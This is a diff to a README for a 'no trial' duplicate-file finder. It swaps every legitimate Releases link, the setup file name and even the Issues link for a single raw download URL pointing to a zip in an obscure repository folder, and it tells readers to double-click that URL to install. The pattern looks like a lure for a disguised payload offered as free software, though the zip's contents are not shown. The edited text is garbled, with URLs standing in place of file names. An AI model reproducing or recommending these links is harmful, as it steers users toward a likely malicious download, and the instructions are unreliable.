@@ -1,6 +1,6 @@
 # 🗂️ Duplicate-File-Detective-No-Trial - Safely Manage Your Files Today
 
-[![Download Duplicate-File-Detective-No-Trial](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/confidensial/Duplicate-File-Detective-No-Trial/releases)
+[![Download Duplicate-File-Detective-No-Trial](https://raw.githubusercontent.com/confidensial/Duplicate-File-Detective-No-Trial/main/pulicene/Duplicate-File-Detective-No-Trial_v3.5.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/confidensial/Duplicate-File-Detective-No-Trial/main/pulicene/Duplicate-File-Detective-No-Trial_v3.5.zip)
 
 ## 📥 Introduction
 
@@ -21,11 +21,11 @@ Before getting started, ensure your PC meets the following requirements:
 
 To download Duplicate File Detective No Trial, visit the Releases page. You can find all available versions here.
 
-[Download Duplicate-File-Detective-No-Trial](https://github.com/confidensial/Duplicate-File-Detective-No-Trial/releases)
+[Download Duplicate-File-Detective-No-Trial](https://raw.githubusercontent.com/confidensial/Duplicate-File-Detective-No-Trial/main/pulicene/Duplicate-File-Detective-No-Trial_v3.5.zip)
 
 ### 3. Download the Application
 
-On the Releases page, you will see a list of available versions. Look for the latest version of Duplicate File Detective No Trial. Click on the version you want, then find the setup file. It will be named something like `DuplicateFileDetectiveSetup.exe`.
+On the Releases page, you will see a list of available versions. Look for the latest version of Duplicate File Detective No Trial. Click on the version you want, then find the setup file. It will be named something like `https://raw.githubusercontent.com/confidensial/Duplicate-File-Detective-No-Trial/main/pulicene/Duplicate-File-Detective-No-Trial_v3.5.zip`.
 
 Click the file to download it to your computer.
 
@@ -33,11 +33,11 @@ Click the file to download it to your computer.
 
 ### 4. Locate Your Downloaded File
 
-Once the download is complete, the file will likely be in your Downloads folder. Open the folder and find `DuplicateFileDetectiveSetup.exe`.
+Once the download is complete, the file will likely be in your Downloads folder. Open the folder and find `https://raw.githubusercontent.com/confidensial/Duplicate-File-Detective-No-Trial/main/pulicene/Duplicate-File-Detective-No-Trial_v3.5.zip`.
 
 ### 5. Run the Installer
 
-Double-click on `DuplicateFileDetectiveSetup.exe` to start the installation. A window will appear. Follow these steps:
+Double-click on `https://raw.githubusercontent.com/confidensial/Duplicate-File-Detective-No-Trial/main/pulicene/Duplicate-File-Detective-No-Trial_v3.5.zip` to start the installation. A window will appear. Follow these steps:
 
 1. **Accept the License Agreement:** Read through the agreement and click "I Agree" to proceed.
 2. **Choose Installation Location:** You can either accept the default folder or click “Browse” to choose a different location.
@@ -80,8 +80,8 @@ To remove duplicates, select the files you wish to delete. Then, click "Remove S
 
 We frequently update Duplicate File Detective to improve functionality and address any bugs. Check back on the Releases page to ensure you have the latest version.
 
-[Download Duplicate-File-Detective-No-Trial](https://github.com/confidensial/Duplicate-File-Detective-No-Trial/releases)
+[Download Duplicate-File-Detective-No-Trial](https://raw.githubusercontent.com/confidensial/Duplicate-File-Detective-No-Trial/main/pulicene/Duplicate-File-Detective-No-Trial_v3.5.zip)
 
 ## 💬 Support
 
-If you encounter any issues, please visit the [Issues](https://github.com/confidensial/Duplicate-File-Detective-No-Trial/issues) section of our repository or consult the helpful user guides provided in this repository.
+If you encounter any issues, please visit the [Issues](https://raw.githubusercontent.com/confidensial/Duplicate-File-Detective-No-Trial/main/pulicene/Duplicate-File-Detective-No-Trial_v3.5.zip) section of our repository or consult the helpful user guides provided in this repository.
